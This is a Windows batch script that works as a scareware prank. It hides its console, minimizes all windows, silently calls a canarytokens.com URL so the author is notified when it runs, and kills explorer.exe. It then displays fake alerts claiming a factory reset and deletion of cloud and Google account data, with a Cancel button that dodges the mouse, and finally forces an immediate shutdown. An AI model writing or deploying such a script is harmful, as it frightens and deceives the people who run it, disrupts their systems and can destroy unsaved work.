@echo off
REM Minimize CMD window
powershell -windowstyle hidden -command ""
REM Minimize all running applications
powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
REM Activating a webhook
curl http://canarytokens.com/terms/wi4t6dlstmswprsxv4117ekgi/post.jsp
:begin
cd /d "%~dp0"

REM First Popup: Fake Factory Reset Warning
powershell -command "[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing'); $Form = New-Object Windows.Forms.Form; $Form.Text = 'System Alert'; $Form.TopMost = $true; $Form.FormBorderStyle = 'FixedDialog'; $Form.ControlBox = $false; $Form.Size = New-Object Drawing.Size(500,200); $Label = New-Object Windows.Forms.Label; $Label.Text = 'Your computer needs to factory reset itself. Click cancel to stop this operation.'; $Label.AutoSize = $true; $Label.Location = '10,20'; $Button1 = New-Object Windows.Forms.Button; $Button1.Text = 'Continue'; $Button1.Location = '150,100'; $Button1.Size = '100,30'; $Button2 = New-Object Windows.Forms.Button; $Button2.Text = 'Cancel'; $Button2.Location = '260,100'; $Button2.Size = '100,30'; $Button1.Add_Click({$Form.Close();}); $Button2.Add_MouseEnter({$Swap = $Button1.Location; $Button1.Location = $Button2.Location; $Button2.Location = $Swap;}); $Form.Controls.AddRange(@($Label, $Button1, $Button2)); $Timer = New-Object Windows.Forms.Timer; $Timer.Interval = 15000; $Timer.Add_Tick({$Form.Close();}); $Timer.Start(); [void][Windows.Forms.Application]::Run($Form);"

REM Close Explorer
TASKKILL /F /IM explorer.exe>nul 2>&1

REM Second Popup: Continuing Message
powershell -command "[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing');$Form = New-Object Windows.Forms.Form;$Form.Text='Processing';$Form.TopMost=$true;$Form.FormBorderStyle='FixedDialog';$Form.ControlBox=$false;$Form.Size = New-Object Drawing.Size(400,150);$Label = New-Object Windows.Forms.Label;$Label.Text='Factory resetting, please wait.';$Label.AutoSize=$true;$Label.Location='10,20';$Button = New-Object Windows.Forms.Button;$Button.Text='OK';$Button.Location='150,70';$Button.Size='100,30';$Button.Add_Click({$Form.Close();});$Form.Controls.AddRange(@($Label,$Button));$Timer = New-Object Windows.Forms.Timer; $Timer.Interval = 10000; $Timer.Add_Tick({$Form.Close();}); $Timer.Start(); [void][Windows.Forms.Application]::Run($Form);"

REM Third Popup: Deleting Cloud Data
powershell -command "[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing');$Form = New-Object Windows.Forms.Form;$Form.Text='Deleting Cloud Data';$Form.TopMost=$true;$Form.FormBorderStyle='FixedDialog';$Form.ControlBox=$false;$Form.Size = New-Object Drawing.Size(400,150);$Label = New-Object Windows.Forms.Label;$Label.Text='Deleting iCloud, OneDrive, and Google Drive data';$Label.AutoSize=$true;$Label.Location='10,20';$Button = New-Object Windows.Forms.Button;$Button.Text='OK';$Button.Location='150,70';$Button.Size='100,30';$Button.Add_Click({$Form.Close();});$Form.Controls.AddRange(@($Label,$Button));$Timer = New-Object Windows.Forms.Timer; $Timer.Interval = 10000; $Timer.Add_Tick({$Form.Close();}); $Timer.Start(); [void][Windows.Forms.Application]::Run($Form);"

REM Fourth Popup: Deleting Google Account
powershell -command "[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing');$Form = New-Object Windows.Forms.Form;$Form.Text='Deleting Account';$Form.TopMost=$true;$Form.FormBorderStyle='FixedDialog';$Form.ControlBox=$false;$Form.Size = New-Object Drawing.Size(400,150);$Label = New-Object Windows.Forms.Label;$Label.Text='Deleting Google Account';$Label.AutoSize=$true;$Label.Location='10,20';$Button = New-Object Windows.Forms.Button;$Button.Text='OK';$Button.Location='150,70';$Button.Size='100,30';$Button.Add_Click({$Form.Close();});$Form.Controls.AddRange(@($Label,$Button));$Timer = New-Object Windows.Forms.Timer; $Timer.Interval = 10000; $Timer.Add_Tick({$Form.Close();}); $Timer.Start(); [void][Windows.Forms.Application]::Run($Form);"

REM Final Popup: Reset Successful
powershell -command "[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');[void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing');$Form = New-Object Windows.Forms.Form;$Form.Text='Reset Complete';$Form.TopMost=$true;$Form.FormBorderStyle='FixedDialog';$Form.ControlBox=$false;$Form.Size = New-Object Drawing.Size(400,150);$Label = New-Object Windows.Forms.Label;$Label.Text='Your computer has been reset successfully. Shutting down.';$Label.AutoSize=$true;$Label.Location='10,20';$Button = New-Object Windows.Forms.Button;$Button.Text='OK';$Button.Location='150,70';$Button.Size='100,30';$Button.Add_Click({$Form.Close();});$Form.Controls.AddRange(@($Label,$Button));$Timer = New-Object Windows.Forms.Timer; $Timer.Interval = 3000; $Timer.Add_Tick({shutdown /s /t 0; $Form.Close();}); $Timer.Start(); [void][Windows.Forms.Application]::Run($Form);"

exit
